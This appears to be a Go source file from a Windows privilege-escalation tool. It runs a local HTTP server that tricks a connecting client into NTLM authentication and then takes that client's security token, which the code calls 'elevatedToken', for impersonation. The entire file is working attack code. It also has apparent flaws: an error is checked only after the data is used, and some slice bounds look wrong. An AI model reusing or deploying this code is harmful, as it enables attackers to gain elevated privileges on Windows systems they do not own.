package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"strconv"
	"syscall"
	"unsafe"

	"github.com/alexbrainman/sspi/ntlm"
	"golang.org/x/sys/windows"
)

type HTTPNTLMNegotiator struct {
	Host    string
	Port    int
	Context *ntlm.ServerContext
	Chan    chan NegotiatorResult
}

func (negotiator HTTPNTLMNegotiator) Serve() NegotiatorResult {

	go http.ListenAndServe(negotiator.Host+":"+strconv.Itoa(negotiator.Port), &negotiator)

	fmt.Println("[+] Started HTTP NTLM negotiator")
	result := <-negotiator.Chan

	return result
}

func (negotiator HTTPNTLMNegotiator) Trigger() bool {
	return true
}

func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *http.Request) {
	ntlmHash := req.Header.Get("Authorization")

	if len(ntlmHash) == 0 {
		negotiator.Context.Release()
		res.Header().Set("WWW-Authenticate", "NTLM")
		res.WriteHeader(http.StatusUnauthorized)
		fmt.Println("[+] " + req.RemoteAddr + " connect")
	} else {
		bytes, err := base64.StdEncoding.DecodeString(ntlmHash[5:])
		ntlmLoc := ParseNTLM(bytes)
		ntlmBytes := bytes[ntlmLoc : len(bytes)-ntlmLoc]

		if err != nil {
			fmt.Println("[!] Client sent illegal NTLM")
			return
		}

		messageType := bytes[ntlmLoc+8]
		switch messageType {
		case 1:
			creds, err := ntlm.AcquireServerCredentials()

			if err != nil {
				fmt.Println("[!] Couldn't allocate server credentials")
				return
			}

			context, challenge, err := ntlm.NewServerContext(creds, ntlmBytes)
			challenge = []byte(base64.StdEncoding.EncodeToString(challenge))
			negotiator.Context = context

			if err != nil {
				fmt.Println("[!] Could not create new server context")
				return
			}

			res.Header().Set("WWW-Authenticate", "NTLM "+string(challenge))
			res.WriteHeader(http.StatusUnauthorized)
			fmt.Println("[+] " + req.RemoteAddr + " negotiate " + ntlmHash + "\n[+] Sending challenge " + string(challenge))
		case 3:
			err = negotiator.Context.Update(ntlmBytes)

			if err != nil {
				fmt.Println("[!] Couldn't complete NTLM authentication")
				return
			}

			res.Header().Set("WWW-Authenticate", "NTLM")
			res.WriteHeader(http.StatusOK)
			fmt.Println("[+] " + req.RemoteAddr + " authenticated")

			var elevatedToken windows.Token
			_, _, err = querySecurityContextToken.Call(uintptr(unsafe.Pointer(&negotiator.Context.Context().Handle.Lower)), uintptr(unsafe.Pointer(&elevatedToken)))

			if err != syscall.Errno(0) {
				fmt.Println("[!] Failed to query security context token")
				negotiator.Chan <- NegotiatorResult{nil, err}
				return
			}

			negotiator.Chan <- NegotiatorResult{&elevatedToken, nil}
		}
	}
}

func ParseNTLM(bytes []byte) int {
	pattern := [7]byte{0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50}
	pIdx := 0

	for i, v := range bytes {
		if v == pattern[pIdx] {
			pIdx++
			if pIdx == 7 {
				return i - 6
			}
		} else {
			pIdx = 0
		}
	}

	return -1
}
